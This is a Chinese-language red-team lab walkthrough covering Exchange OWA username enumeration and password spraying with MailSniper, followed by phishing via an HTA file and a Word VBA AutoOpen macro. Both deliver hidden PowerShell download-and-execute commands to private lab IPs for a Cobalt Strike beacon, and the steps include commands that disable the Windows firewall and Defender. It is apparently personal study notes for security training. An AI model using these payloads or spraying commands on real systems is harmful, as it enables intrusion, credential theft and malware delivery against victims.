# 哈希喷洒

使用工具：[MailSniper](https://github.com/dafthack/MailSniper)和[SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)

**注意，下面操作必须先禁用windows Defender 的实时保护**

1. 关闭防火墙：
```NetSh Advfirewall set allprofiles state off```

关掉实时防护
```
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```

引入MailSniper.ps1
```
PS C:\> ipmo C:\Tools\MailSniper\MailSniper.ps1
```

枚举NetBIOS 
```
PS C:\Users\Administrator> Invoke-DomainHarvestOWA -ExchHostname 10.10.15.100
[*] Harvesting domain name from the server at 10.10.15.100
The domain appears to be: CYBER or cyberbotic.io
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658538796242.png)


从```https://cyberbotic.io```收集到一份用户名单
```
root@kali:~# cat names.txt
Bob Farmer
Isabel Yates
John King
Joyce Adams
```

根据上面的用户名单制作成一份各种名字的组合方式列表
```
root@kali:~# /opt/namemash.py names.txt >> possible-usernames.txt
root@kali:~# head -n 5 possible-usernames.txt
bobfarmer
farmerbob
bob.farmer
farmer.bob
farmerb
```
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658538616187.png)


把用户名单从kali拷贝到啊windwos攻击机
```
 pscp root@kali:/root/possible-usernames.txt .
```

探测合法的用户名
```
 Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain CYBER -UserList .\possible-usernames.txt -OutFile valid.txt
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658539073418.png)


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658539231023.png)

合法的用户名是：```CYBER\iyates```


假设我们此时知道了一个密码，根据上面的合法用户名单，对密码进行喷洒
```
Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\valid.txt -Password Summer2021
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658539331939.png)

# 网络钓鱼

一个hta文件样板
```
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```


建立一个监听
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658539559821.png)

建立一个hta，选择上面的监听

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658539710862.png)


生成payload：```Attacks > Web Drive-by > Scripted Web Delivery (S)```

(64位)
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
```

(32位)
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```


把payload复制到hta里
```
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
	  Set shell = CreateObject("wscript.Shell")

	  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
	    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/a'))"""
	  Else
	    shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/b'))"""
	  End If

	End Function

    Pwn
  </script>
</html>
```

尝试点击hta文件，获得shell
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658540407567.png)

生成payload：``` Attacks > Web drive-by > Host File```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658541257705.png)

得到一个钓鱼链接：
```
http://10.10.5.120:80/id_rsa
```


# VBA宏

创建宏
```
View > Macros > Create
```

一个基本的宏代码
```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

其实跟上面的hta大同小异，把

64：
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:80/a'))"
```
32：
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:80/b'))"
```

宏代码：
```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
	    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:80/a'))"""
	  Else
	    shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:80/b'))"""
  End If

End Sub
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658542072298.png)

登录WKSTN-1 ，自动登录到bfarmer的账号，接受邮件，点击链接或者doc文件
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658542667640.png)

CS返回一个Bacon
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658542784090.png)

